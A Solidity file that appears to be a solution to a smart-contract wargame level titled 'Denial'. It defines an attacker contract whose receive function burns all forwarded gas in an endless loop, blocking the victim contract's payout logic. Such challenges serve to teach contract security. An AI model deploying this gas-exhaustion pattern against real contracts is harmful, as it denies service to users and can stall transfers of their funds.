// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                        LEVEL 20 - DENIAL                     │
// ================================================================
contract AttackContract {
    uint256 counter;

    function burn() internal {
        while (gasleft() > 0) {
            counter += 1;
        }
    }

    receive() external payable {
        burn();
    }
}
